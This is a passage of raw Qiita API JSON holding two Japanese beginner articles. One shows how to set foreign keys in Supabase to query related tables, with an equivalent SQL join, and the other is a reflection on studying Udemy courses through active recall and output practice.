srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F5ded0301-377f-4fb6-9762-778d1d01f452.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=86067b5f480a293ad9d8552f01406c1f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/5ded0301-377f-4fb6-9762-778d1d01f452.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"81:1-81:51\">\n<span id=\"リレーションで取得するように修正\" class=\"fragment\"></span><a href=\"#%E3%83%AA%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%A7%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E4%BF%AE%E6%AD%A3\"><i class=\"fa fa-link\"></i></a>リレーションで取得するように修正</h2>\n<p data-sourcepos=\"83:1-83:104\">Supabaseでは外部キーの関係を自動的に検出して、簡単にデータを取得できます</p>\n<ul data-sourcepos=\"85:1-85:38\">\n<li data-sourcepos=\"85:1-85:38\">公式ドキュメントより引用</li>\n</ul>\n<blockquote data-sourcepos=\"86:1-88:193\">\n<p data-sourcepos=\"86:2-86:147\">The data APIs automatically detect relationships between Postgres tables. Since Postgres is a relational database, this is a very common scenario.</p>\n<blockquote data-sourcepos=\"87:2-88:193\">\n<p data-sourcepos=\"87:4-88:193\">(日本語訳)<br>\nデータAPIは自動的にPostgresテーブル間の関係を検出します。Postgresはリレーショナルデータベースなので、これは非常に一般的なシナリオです。</p>\n</blockquote>\n</blockquote>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"90:1-95:3\"><div class=\"highlight\"><pre><code>  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"nx\">error</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">supabase</span>\n    <span class=\"p\">.</span><span class=\"k\">from</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">users</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">select</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">*, user_skill(skills(name))</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">eq</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">user_id</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"nx\">id</span><span class=\"p\">);</span>\n</code></pre></div></div>\n<ul data-sourcepos=\"97:1-101:0\">\n<li data-sourcepos=\"97:1-97:54\">\n<code>from(\"users\")</code>: usersテーブルから取得する</li>\n<li data-sourcepos=\"98:1-98:76\">\n<code>.select(\"* </code>: <code>*</code>でusersテーブルの全てのカラムを取得する</li>\n<li data-sourcepos=\"99:1-99:60\">\n<code>user_skill()</code>: usersのuser_idと紐づくものを取得</li>\n<li data-sourcepos=\"100:1-101:0\">\n<code>skills(name)</code>：user_skillと紐づくidからskillsテーブルのidと紐づくものを取得</li>\n</ul>\n<p data-sourcepos=\"102:1-102:48\">以下のSQLと同じことをしています。</p>\n<div class=\"code-frame\" data-lang=\"sql\" data-sourcepos=\"104:1-116:3\"><div class=\"highlight\"><pre><code><span class=\"k\">SELECT</span> \n  <span class=\"n\">users</span><span class=\"p\">.</span><span class=\"o\">*</span><span class=\"p\">,</span>\n  <span class=\"n\">skills</span><span class=\"p\">.</span><span class=\"n\">name</span>\n<span class=\"k\">FROM</span> \n  <span class=\"n\">users</span>\n<span class=\"k\">LEFT</span> <span class=\"k\">JOIN</span> \n  <span class=\"n\">user_skill</span> <span class=\"k\">ON</span> <span class=\"n\">users</span><span class=\"p\">.</span><span class=\"n\">id</span> <span class=\"o\">=</span> <span class=\"n\">user_skill</span><span class=\"p\">.</span><span class=\"n\">user_id</span>\n<span class=\"k\">LEFT</span> <span class=\"k\">JOIN</span> \n  <span class=\"n\">skills</span> <span class=\"k\">ON</span> <span class=\"n\">user_skill</span><span class=\"p\">.</span><span class=\"n\">skill_id</span> <span class=\"o\">=</span> <span class=\"n\">skills</span><span class=\"p\">.</span><span class=\"n\">id</span>\n<span class=\"k\">WHERE</span> \n  <span class=\"n\">users</span><span class=\"p\">.</span><span class=\"n\">user_id</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"n\">id</span><span class=\"err\">値</span><span class=\"p\">]</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"120:1-120:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"121:1-122:45\">外部キーをなぜ指定しないといけないのかわかっていない状態でした。<br>\nSQLの学習も進めていきたいです。</p>\n<h1 data-sourcepos=\"124:1-124:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"125:1-125:51\"><iframe id=\"qiita-embed-content__8165b27389ab377d22695b16b28aaab7\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8165b27389ab377d22695b16b28aaab7\" data-content=\"https%3A%2F%2Fqiita.com%2Fkitao6%2Fitems%2F7de2e73c3fff82a43da8\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"127:1-127:138\"><iframe id=\"qiita-embed-content__0a814c14bc235f38df3014b411cd85b2\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0a814c14bc235f38df3014b411cd85b2\" data-content=\"https%3A%2F%2Fsupabase.com%2Fdocs%2Fguides%2Fdatabase%2Fjoins-and-nesting%3FqueryGroups%3Doutput-format%26output-format%3Dtable%26queryGroups%3Dlanguage%26language%3Djs\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"129:1-129:53\"><iframe id=\"qiita-embed-content__5108933381db83d3a3b89a99678384d8\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__5108933381db83d3a3b89a99678384d8\" data-content=\"https%3A%2F%2Fsupabase.com%2Fdocs%2Freference%2Fjavascript%2Fselect\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nSupabaseから複数の関連テーブルからデータを取得しようとした際につまりました。\n\n# 問題\n以下の３つのテーブルを定義していました。\n下記の手順でデータを取得したかったです。\n\n* usersテーブルのuser_idを元に、user_skillテーブルのuser_idを参照\n* user_skillテーブルのskill_idを元に、skillsテーブルのidを参照\n* skillsテーブルのnameを取得\n<br>\n\n* **usersテーブル**\n\n| user_id: varchar | name: varchar | description: text | a_id: varchar | b_id: varchar | c_id: varchar | created_at: timestamptz |\n|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\n| sample-id | なまえ | \\<h1>なまえ\\</h1> | aのid | bのid | cのid | 2025-XX-XX |\n\n* **user_skillテーブル**\n\n| id: int8 | user_id: varchar | skill_id: int8 | created_at: timestamptz |\n|:-:|:-:|:-:|:-:|\n| 1 | sample-id | 1 | 2025-XX-XX |\n\n* **skillsテーブル**\n\n| id: int8 | name: varchar | created_at: timestamptz |\n|:-:|:-:|:-:|\n| 1 | React | 2025-XX-XX |\n| 2 | TypeScript | 2025-XX-XX |\n| 3 | GitHub | 2025-XX-XX |\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/9b300f86-da16-4200-978f-a022d1ba7f8f.png)\n\n\n\n# 解決方法\n## user_skillテーブルに外部キーを設定する\n\n* user_skillテーブルの`user_id`を外部キーとして設定\n（参照先はusersテーブルの主キー: `user_id`）\n* user_skillテーブルの`skill_id`を外部キーとして設定\n（参照先はskillsテーブルの主キー: `id`）\n\n### 外部キーとは\nあるテーブルのカラム（列）が別のテーブルの`主キー`を参照すること\n\n### なぜ外部キーの設定が必要？\n外部整合制約のメリットをもらうため\n\n#### データの整合性保持\nskillsテーブルのid=1のレコードを削除した場合、user_skillテーブルのskill_id=1はどこも参照できず、ただのデータになってしまいます。\n\n#### 誤削除の防止\n外部キーの設定を行うことで、意図せずレコードを削除してしまうことを防ぐことができます。\n\n試しに、skill_id=1を消そうとすると、エラーとなり削除を防ぐことができました。\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/6a6e8553-b3e4-43a1-afb6-5f9b42764fec.png)\n\n\n## Supabaseのdashbordから外部キーを設定する\n1. user_skillテーブルのuser_idをクリック、`Edit column`を選択\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b99f4be4-60a9-46a1-82ae-0fd27cd8fdd1.png)\n\n2\\. `Add foreign key`を押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/01c12a4b-3a2f-4efc-a396-3899c0bfdad3.png)\n\n\n3\\. 参照するテーブルを選択（今回は`usersテーブル`）\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a07e574c-f5e0-4ae4-ab93-9ae23cd6fc1a.png)\n\n4\\. 参照するカラムを選択（今回は`user_idカラム`）選択後、`Save`を押下\n\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/5ded0301-377f-4fb6-9762-778d1d01f452.png)\n\n\n## リレーションで取得するように修正\n\nSupabaseでは外部キーの関係を自動的に検出して、簡単にデータを取得できます\n\n* 公式ドキュメントより引用\n>The data APIs automatically detect relationships between Postgres tables. Since Postgres is a relational database, this is a very common scenario.\n>> (日本語訳)\nデータAPIは自動的にPostgresテーブル間の関係を検出します。Postgresはリレーショナルデータベースなので、これは非常に一般的なシナリオです。\n\n```ts:\n  const { data, error } = await supabase\n    .from(\"users\")\n    .select(\"*, user_skill(skills(name))\")\n    .eq(\"user_id\", id);\n```\n\n* `from(\"users\")`: usersテーブルから取得する\n* `.select(\"* `: `*`でusersテーブルの全てのカラムを取得する\n* `user_skill()`: usersのuser_idと紐づくものを取得\n* `skills(name)`：user_skillと紐づくidからskillsテーブルのidと紐づくものを取得\n\n以下のSQLと同じことをしています。\n\n```sql\nSELECT \n  users.*,\n  skills.name\nFROM \n  users\nLEFT JOIN \n  user_skill ON users.id = user_skill.user_id\nLEFT JOIN \n  skills ON user_skill.skill_id = skills.id\nWHERE \n  users.user_id = [id値]\n```\n\n\n\n# おわりに\n外部キーをなぜ指定しないといけないのかわかっていない状態でした。\nSQLの学習も進めていきたいです。\n\n# 参考\nhttps://qiita.com/kitao6/items/7de2e73c3fff82a43da8\n\nhttps://supabase.com/docs/guides/database/joins-and-nesting?queryGroups=output-format&output-format=table&queryGroups=language&language=js\n\nhttps://supabase.com/docs/reference/javascript/select\n","coediting":false,"comments_count":0,"created_at":"2025-04-29T10:09:46+09:00","group":null,"id":"3eb32549a23398d51df5","likes_count":6,"private":false,"reactions_count":0,"stocks_count":2,"tags":[{"name":"JavaScript","versions":[]},{"name":"join","versions":[]},{"name":"Supabase","versions":[]}],"title":"【Supabase】複数テーブルの関連データを取得したい","updated_at":"2025-04-29T10:09:46+09:00","url":"https://qiita.com/asa129/items/3eb32549a23398d51df5","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":3909,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-2:109\">煽りタイトルのようになってしまいましたが、3か月前の私に向けて書きました。</p>\n<p data-sourcepos=\"4:1-4:162\">Udemyはセールの時期に1000円前後で購入でき、興味のある技術や言語などを習得できる素晴らしい動画学習サービスです。</p>\n<p data-sourcepos=\"6:1-6:160\">しかし、<strong>使い方を誤ると「動画を見た」満足感だけが得られ、「時間」を奪う非常に危険なもの</strong>とも考えています。</p>\n<p data-sourcepos=\"8:1-10:66\">現在、所属しているコミュニティでの教えを踏まえ、勉強方法を思いっきり変えてみました。<br>\n勉強方法を変えたことで、初めてUdemyで学びつつ、自分の技術を身に着けることができたと感じています。<br>\nここで得られた私の考えを述べたいと思います。</p>\n<h1 data-sourcepos=\"12:1-12:34\">\n<span id=\"以前の私のudemy利用方法\" class=\"fragment\"></span><a href=\"#%E4%BB%A5%E5%89%8D%E3%81%AE%E7%A7%81%E3%81%AEudemy%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>以前の私のUdemy利用方法</h1>\n<p data-sourcepos=\"13:1-27:72\">あ、この技術や言語モダンだし、学習したらきっと価値になる、1500円で買える！買おう！<br>\n↓<br>\n購入<br>\n↓<br>\nいざ、視聴開始！動画をみながら真似して自分でも写経してみる<br>\n↓<br>\n面白い！こんなことできるんだ～と感想を抱く（ただ感じるだけで、何かに書き出すことなどはしない）<br>\n↓<br>\nチェックがついていく、ここまで見られた私すごいと謎の満足感を得る<br>\n↓<br>\nどんどん進める<br>\n↓<br>\n動画視聴完了<br>\n↓<br>\nここからは何もせず、次の気になる動画を買ってみる</p>\n<p data-sourcepos=\"29:1-29:120\">（自分で書いていて恥ずかしいですが、同じ経験をしている人は私以外にもいるはず...）</p>\n<h1 data-sourcepos=\"31:1-31:8\">\n<span id=\"結果\" class=\"fragment\"></span><a href=\"#%E7%B5%90%E6%9E%9C\"><i class=\"fa fa-link\"></i></a>結果</h1>\n<ul data-sourcepos=\"32:1-35:0\">\n<li data-sourcepos=\"32:1-32:29\">何も身についてない</li>\n<li data-sourcepos=\"33:1-33:113\">この動画ってなんの動画だっけ？あ、こういう技術を学べる動画だったなで終わり</li>\n<li data-sourcepos=\"34:1-35:0\">動画の内容を使って応用ができない、何かを作ることもできない</li>\n</ul>\n<p data-sourcepos=\"36:1-36:40\"><strong>→結局なにもできない状態</strong></p>\n<h1 data-sourcepos=\"38:1-38:32\">\n<span id=\"何がいけなかったのか\" class=\"fragment\"></span><a href=\"#%E4%BD%95%E3%81%8C%E3%81%84%E3%81%91%E3%81%AA%E3%81%8B%E3%81%A3%E3%81%9F%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>何がいけなかったのか</h1>\n<h2 data-sourcepos=\"39:1-39:78\">\n<span id=\"興味のあるコンテンツに手当たり次第手を出していた\" class=\"fragment\"></span><a href=\"#%E8%88%88%E5%91%B3%E3%81%AE%E3%81%82%E3%82%8B%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%81%AB%E6%89%8B%E5%BD%93%E3%81%9F%E3%82%8A%E6%AC%A1%E7%AC%AC%E6%89%8B%E3%82%92%E5%87%BA%E3%81%97%E3%81%A6%E3%81%84%E3%81%9F\"><i class=\"fa fa-link\"></i></a>興味のあるコンテンツに手当たり次第、手を出していた</h2>\n<p data-sourcepos=\"40:1-41:113\">→WEB3、fintech、フロントエンド、バックエンド、クラウドなど少しでも興味があるものを購入しては視聴していました。<br>\n<strong>技術を限定して学ぶ</strong>、<strong>スモールステップで進める</strong>ことをしていませんでした。</p>\n<h2 data-sourcepos=\"43:1-43:18\">\n<span id=\"見て終わり\" class=\"fragment\"></span><a href=\"#%E8%A6%8B%E3%81%A6%E7%B5%82%E3%82%8F%E3%82%8A\"><i class=\"fa fa-link\"></i></a>見て終わり</h2>\n<p data-sourcepos=\"44:1-46:70\">動画を視聴した後に、<strong>何も振り返らず、次の動画だけ進むことだけ</strong>を考えていました。<br>\n全て視聴した後、<code>見た事実とチェックマークがうまったことによる満足感だけを得ることができます</code><br>\n→結果、<strong>何も習得できていない</strong>という状態です。</p>\n<p data-sourcepos=\"48:1-49:57\">満足感は得られるので、<strong>勉強した感覚、私は勉強をしているという気にはなれます</strong><br>\nここが一番怖いところだと感じています。</p>\n<h1 data-sourcepos=\"51:1-51:41\">\n<span id=\"アウトプットの重要性を認識\" class=\"fragment\"></span><a href=\"#%E3%82%A2%E3%82%A6%E3%83%88%E3%83%97%E3%83%83%E3%83%88%E3%81%AE%E9%87%8D%E8%A6%81%E6%80%A7%E3%82%92%E8%AA%8D%E8%AD%98\"><i class=\"fa fa-link\"></i></a>アウトプットの重要性を認識</h1>\n<p data-sourcepos=\"52:1-53:223\"><strong>「これなら自分はできる」という状態までアウトプットしなかった結果、なにもできない状態が生まれていました。</strong><br>\n動画の内容を元に、<code>自分で実装してみる、超簡単な機能を作ってみる</code>ことをすれば、完璧じゃなくても<code>自分ができる感覚、成功体験を掴むこと</code>ができたはずです。</p>\n<p data-sourcepos=\"55:1-56:120\">色々模索しているときに、アウトプットが大事という情報を知ります。<br>\n確かに、私はインプットだけしていた、アウトプットをしていなかったと気づきました。</p>\n<p data-sourcepos=\"58:1-58:193\">しかし、この時点では<code>ぶっちゃけUdemyなんて見ることしかできない、具体的にアウトプットってどうやるの？無理では？</code>とも思っていました。</p>\n<h1 data-sourcepos=\"60:1-60:44\">\n<span id=\"実際に試したアウトプット方法\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E9%9A%9B%E3%81%AB%E8%A9%A6%E3%81%97%E3%81%9F%E3%82%A2%E3%82%A6%E3%83%88%E3%83%97%E3%83%83%E3%83%88%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>実際に試したアウトプット方法</h1>\n<h2 data-sourcepos=\"61:1-61:105\">\n<span id=\"動画を見た後に何を見たのか何を学んだのか白紙にできるだけ書き出す\" class=\"fragment\"></span><a href=\"#%E5%8B%95%E7%94%BB%E3%82%92%E8%A6%8B%E3%81%9F%E5%BE%8C%E3%81%AB%E4%BD%95%E3%82%92%E8%A6%8B%E3%81%9F%E3%81%AE%E3%81%8B%E4%BD%95%E3%82%92%E5%AD%A6%E3%82%93%E3%81%A0%E3%81%AE%E3%81%8B%E7%99%BD%E7%B4%99%E3%81%AB%E3%81%A7%E3%81%8D%E3%82%8B%E3%81%A0%E3%81%91%E6%9B%B8%E3%81%8D%E5%87%BA%E3%81%99\"><i class=\"fa fa-link\"></i></a>動画を見た後に、何を見たのか・何を学んだのか白紙にできるだけ書き出す</h2>\n<p data-sourcepos=\"62:1-62:99\">こちらの書籍を参考に、アクティブリコールというものを実践しました。</p>\n<p data-sourcepos=\"64:1-64:230\"><iframe id=\"qiita-embed-content__7a5ec301df87f2017982138408522b0a\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7a5ec301df87f2017982138408522b0a\" data-content=\"https%3A%2F%2Fwww.amazon.co.jp%2F%25E7%25A7%2591%25E5%25AD%25A6%25E7%259A%2584%25E6%25A0%25B9%25E6%258B%25A0%25E3%2581%25AB%25E5%259F%25BA%25E3%2581%25A5%25E3%2581%258F%25E6%259C%2580%25E9%25AB%2598%25E3%2581%25AE%25E5%258B%2589%25E5%25BC%25B7%25E6%25B3%2595-%25E5%25AE%2589%25E5%25B7%259D-%25E5%25BA%25B7%25E4%25BB%258B%2Fdp%2F4046067233%2Fref%3Dsr_1_1%3Fsr%3D8-1\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"66:1-67:60\">1セクション視聴後、<code>今私は何を見た？ 動画の内容はどんなものだった？どんなことを学んだ？</code>を考えながら、<br>\n思い出せるだけノートに書き起こしました。</p>\n<p data-sourcepos=\"69:2-70:72\">例えば、TypeScriptの概論について動画を視聴後、全部で5つの特徴言っていたな、なんだっけ…頑張って思い出せ、書いてみよう…<br>\n→どうしても思い出せなかった箇所があったら見返す</p>\n<p data-sourcepos=\"72:1-72:84\">次の日に、昨日見た動画について上記をもう一度行いました。</p>\n<h2 data-sourcepos=\"74:1-74:87\">\n<span id=\"ハンズオンの場合はコードを書いて再現してみることを行う\" class=\"fragment\"></span><a href=\"#%E3%83%8F%E3%83%B3%E3%82%BA%E3%82%AA%E3%83%B3%E3%81%AE%E5%A0%B4%E5%90%88%E3%81%AF%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E6%9B%B8%E3%81%84%E3%81%A6%E5%86%8D%E7%8F%BE%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B%E3%81%93%E3%81%A8%E3%82%92%E8%A1%8C%E3%81%86\"><i class=\"fa fa-link\"></i></a>ハンズオンの場合は、コードを書いて再現してみることを行う</h2>\n<p data-sourcepos=\"75:1-75:144\">ハンズオンの場合は、動画を見た後、何も見ない状態でコードを書いて再現してみることを実践しました。</p>\n<p data-sourcepos=\"77:1-77:304\">そうすることで、<code>まず何をしていたっけ、ここにフォルダ作ってファイル作ってたな</code>、<code>次は○○メソッドを作っていたな</code>、など、実装を進める際にはどのような手順で進めればいいか考え方を身に着けることができました。</p>\n<h1 data-sourcepos=\"79:1-79:29\">\n<span id=\"実践して感じた変化\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E8%B7%B5%E3%81%97%E3%81%A6%E6%84%9F%E3%81%98%E3%81%9F%E5%A4%89%E5%8C%96\"><i class=\"fa fa-link\"></i></a>実践して感じた変化</h1>\n<h2 data-sourcepos=\"80:1-80:90\">\n<span id=\"問題解決するための選択肢引き出しを増やす感覚を得た\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E3%81%99%E3%82%8B%E3%81%9F%E3%82%81%E3%81%AE%E9%81%B8%E6%8A%9E%E8%82%A2%E5%BC%95%E3%81%8D%E5%87%BA%E3%81%97%E3%82%92%E5%A2%97%E3%82%84%E3%81%99%E6%84%9F%E8%A6%9A%E3%82%92%E5%BE%97%E3%81%9F\"><i class=\"fa fa-link\"></i></a>問題解決するための「選択肢」「引き出し」を増やす感覚を得た</h2>\n<h3 data-sourcepos=\"81:1-81:52\">\n<span id=\"暗記ではない結局は忘れてしまう\" class=\"fragment\"></span><a href=\"#%E6%9A%97%E8%A8%98%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%84%E7%B5%90%E5%B1%80%E3%81%AF%E5%BF%98%E3%82%8C%E3%81%A6%E3%81%97%E3%81%BE%E3%81%86\"><i class=\"fa fa-link\"></i></a>暗記ではない、結局は忘れてしまう</h3>\n<p data-sourcepos=\"82:1-82:160\">実践を進めていて、これは<code>暗記では？</code>と感じていました。<code>ただ見てた時と何か変わっただろうか？</code>とも思いました。</p>\n<p data-sourcepos=\"84:1-84:79\"><strong>やり方を変えても忘れますが、忘れ方が変わりました。</strong></p>\n<p data-sourcepos=\"87:1-87:216\">以前は動画の各セクションのタイトルを見たときに、このセクションでは何を行っていたか？、タイトルの意味がわからない、思い出せないという状態でした。</p>\n<p data-sourcepos=\"89:1-89:270\">現在は動画の各セクションタイトルを見たときに、ここでこんなことをやっていたなあ、○○○の方法は確かこんな感じで実現できるんだよなあとぼんやりと学習内容が思い出せるようになりました。</p>\n<p data-sourcepos=\"91:1-91:238\">結局、忘れてはしまうのですが、<code>課題・問題にぶつかったときはここを見返せば、解決できる</code>、<code>課題解決のための選択肢を増やせたこと</code>が明らかに変わったと感じています。</p>\n<p data-sourcepos=\"93:1-93:115\"><strong>知識の引き出し、選択肢を増やせたことが自分の中での大きな変化</strong>となりました。</p>\n<h1 data-sourcepos=\"96:1-96:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<h2 data-sourcepos=\"97:1-97:90\">\n<span id=\"学ぶ意欲がある人こそ勉強方法について再度考えてみてほしい\" class=\"fragment\"></span><a href=\"#%E5%AD%A6%E3%81%B6%E6%84%8F%E6%AC%B2%E3%81%8C%E3%81%82%E3%82%8B%E4%BA%BA%E3%81%93%E3%81%9D%E5%8B%89%E5%BC%B7%E6%96%B9%E6%B3%95%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E5%86%8D%E5%BA%A6%E8%80%83%E3%81%88%E3%81%A6%E3%81%BF%E3%81%A6%E3%81%BB%E3%81%97%E3%81%84\"><i class=\"fa fa-link\"></i></a>学ぶ意欲がある人こそ、勉強方法について再度考えてみてほしい</h2>\n<p data-sourcepos=\"98:1-99:174\">毎日何かしら勉強をしている方は、沢山いらっしゃると思います。<br>\n勉強の方向性を間違えると、私のように時間を費やしているにも関わらず、結果にならない悲しい末路を迎えると感じています。</p>\n<p data-sourcepos=\"101:1-101:246\">アウトプット学習を行ってみて、劇的に変わったわけではないですが、少しずつ自分で課題解決できる機会が増えたり、プロダクトを作ることができたりするようになってきました。</p>\n<p data-sourcepos=\"103:1-103:69\">同じように悩んでいる方の一助になれば幸いです。</p>\n","body":"# はじめに\n煽りタイトルのようになってしまいましたが、3か月前の私に向けて書きました。\n\nUdemyはセールの時期に1000円前後で購入でき、興味のある技術や言語などを習得できる素晴らしい動画学習サービスです。\n\nしかし、**使い方を誤ると「動画を見た」満足感だけが得られ、「時間」を奪う非常に危険なもの**とも考えています。\n\n現在、所属しているコミュニティでの教えを踏まえ、勉強方法を思いっきり変えてみました。\n勉強方法を変えたことで、初めてUdemyで学びつつ、自分の技術を身に着けることができたと感じています。\nここで得られた私の考えを述べたいと思います。\n\n# 以前の私のUdemy利用方法\nあ、この技術や言語モダンだし、学習したらきっと価値になる、1500円で買える！買おう！\n↓\n購入\n↓\nいざ、視聴開始！動画をみながら真似して自分でも写経してみる\n↓\n面白い！こんなことできるんだ～と感想を抱く（ただ感じるだけで、何かに書き出すことなどはしない）\n↓\nチェックがついていく、ここまで見られた私すごいと謎の満足感を得る\n↓\nどんどん進める\n↓\n動画視聴完了\n↓\nここからは何もせず、次の気になる動画を買ってみる\n\n（自分で書いていて恥ずかしいですが、同じ経験をしている人は私以外にもいるはず...）\n\n# 結果\n* 何も身についてない\n* この動画ってなんの動画だっけ？あ、こういう技術を学べる動画だったなで終わり\n* 動画の内容を使って応用ができない、何かを作ることもできない\n\n**→結局なにもできない状態**\n\n# 何がいけなかったのか\n## 興味のあるコンテンツに手当たり次第、手を出していた\n→WEB3、fintech、フロントエンド、バックエンド、クラウドなど少しでも興味があるものを購入しては視聴していました。\n**技術を限定して学ぶ**、**スモールステップで進める**ことをしていませんでした。\n\n## 見て終わり\n動画を視聴した後に、**何も振り返らず、次の動画だけ進むことだけ**を考えていました。\n全て視聴した後、`見た事実とチェックマークがうまったことによる満足感だけを得ることができます`\n→結果、**何も習得できていない**という状態です。\n\n満足感は得られるので、**勉強した感覚、私は勉強をしているという気にはなれます**\nここが一番怖いところだと感じています。\n\n# アウトプットの重要性を認識\n**「これなら自分はできる」という状態までアウトプットしなかった結果、なにもできない状態が生まれていました。**\n動画の内容を元に、`自分で実装してみる、超簡単な機能を作ってみる`ことをすれば、完璧じゃなくても`自分ができる感覚、成功体験を掴むこと`ができたはずです。\n\n色々模索しているときに、アウトプットが大事という情報を知ります。\n確かに、私はインプットだけしていた、アウトプットをしていなかったと気づきました。\n\nしかし、この時点では`ぶっちゃけUdemyなんて見ることしかできない、具体的にアウトプットってどうやるの？無理では？`とも思っていました。\n\n# 実際に試したアウトプット方法\n## 動画を見た後に、何を見たのか・何を学んだのか白紙にできるだけ書き出す\nこちらの書籍を参考に、アクティブリコールというものを実践しました。\n\nhttps://www.amazon.co.jp/%E7%A7%91%E5%AD%A6%E7%9A%84%E6%A0%B9%E6%8B%A0%E3%81%AB%E5%9F%BA%E3%81%A5%E3%81%8F%E6%9C%80%E9%AB%98%E3%81%AE%E5%8B%89%E5%BC%B7%E6%B3%95-%E5%AE%89%E5%B7%9D-%E5%BA%B7%E4%BB%8B/dp/4046067233/ref=sr_1_1?sr=8-1\n\n1セクション視聴後、`今私は何を見た？ 動画の内容はどんなものだった？どんなことを学んだ？`を考えながら、\n思い出せるだけノートに書き起こしました。\n\n 例えば、TypeScriptの概論について動画を視聴後、全部で5つの特徴言っていたな、なんだっけ…頑張って思い出せ、書いてみよう…\n→どうしても思い出せなかった箇所があったら見返す\n\n次の日に、昨日見た動画について上記をもう一度行いました。\n\n## ハンズオンの場合は、コードを書いて再現してみることを行う\nハンズオンの場合は、動画を見た後、何も見ない状態でコードを書いて再現してみることを実践しました。\n\nそうすることで、`まず何をしていたっけ、ここにフォルダ作ってファイル作ってたな`、`次は○○メソッドを作っていたな`、など、実装を進める際にはどのような手順で進めればいいか考え方を身に着けることができました。\n\n# 実践して感じた変化\n## 問題解決するための「選択肢」「引き出し」を増やす感覚を得た\n### 